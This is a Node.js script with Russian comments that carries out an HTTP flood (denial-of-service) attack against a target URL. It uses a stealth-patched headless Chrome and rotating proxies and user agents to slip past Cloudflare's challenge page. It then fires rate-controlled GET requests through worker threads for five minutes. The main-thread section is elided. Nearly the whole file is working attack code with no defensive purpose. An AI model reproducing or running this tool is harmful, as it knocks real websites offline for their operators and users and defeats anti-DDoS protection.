const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');
const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');

// Конфигурация
const CHROME_PATH = '/usr/bin/google-chrome';
const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36'
];

puppeteer.use(StealthPlugin());

async function solveChallenge(page) {
    try {
        // Ожидаем появления challenge формы
        await page.waitForSelector('#challenge-form', { timeout: 10000 });
        
        // Эмулируем человеческое поведение
        await page.mouse.move(100, 100);
        await page.mouse.click(100, 100);
        await page.waitForTimeout(2000 + Math.random() * 3000);
        
        // Отправляем форму
        await page.click('#challenge-form input[type="submit"]');
        await page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 15000 });
        
        return true;
    } catch (e) {
        console.log('Не удалось автоматически решить challenge');
        return false;
    }
}

async function runWorker({ targetUrl, proxy, rate }) {
    const browser = await puppeteer.launch({
        executablePath: CHROME_PATH,
        headless: false, // Для дебага лучше видеть что происходит
        args: [
            `--proxy-server=${proxy}`,
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--ignore-certificate-errors'
        ],
        ignoreHTTPSErrors: true
    });

    try {
        const page = await browser.newPage();
        await page.setJavaScriptEnabled(true);
        
        // Настройка headers
        const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        await page.setUserAgent(userAgent);
        await page.setExtraHTTPHeaders({
            'Accept-Language': 'en-US,en;q=0.9'
        });

        // Перехват ответов для дебага
        page.on('response', response => {
            if(response.status() >= 400) {
                console.log(`Ошибка ${response.status()} на ${response.url()}`);
            }
        });

        console.log(`Пытаемся загрузить ${targetUrl} через прокси ${proxy}`);
        await page.goto(targetUrl, {
            waitUntil: 'networkidle2',
            timeout: 30000
        });

        // Проверяем не попали ли на challenge страницу
        const pageTitle = await page.title();
        if(pageTitle.includes('Just a moment') || pageTitle.includes('DDoS protection')) {
            console.log('Обнаружена защита Cloudflare, пытаемся обойти...');
            const solved = await solveChallenge(page);
            if(!solved) {
                throw new Error('Не удалось обойти защиту');
            }
        }

        console.log('Успешно прошли защиту, начинаем флуд...');
        const proxyConfig = {
            host: proxy.split(':')[0],
            port: parseInt(proxy.split(':')[1])
        };

        // Флуд запросами
        const floodInterval = setInterval(() => {
            axios.get(targetUrl, {
                proxy: proxyConfig,
                headers: { 
                    'User-Agent': userAgent,
                    'Cache-Control': 'no-cache'
                },
                timeout: 5000
            }).catch(e => console.log(`Ошибка запроса: ${e.message}`));
        }, 1000 / rate);

        // Автоматическое закрытие через 5 минут
        setTimeout(async () => {
            clearInterval(floodInterval);
            await browser.close();
        }, 300000);

    } catch (error) {
        console.error(`Критическая ошибка: ${error.message}`);
        await browser.close();
    }
}

if (isMainThread) {
    // ... (остальной код без изменений)
} else {
    runWorker(workerData).catch(console.error);
}
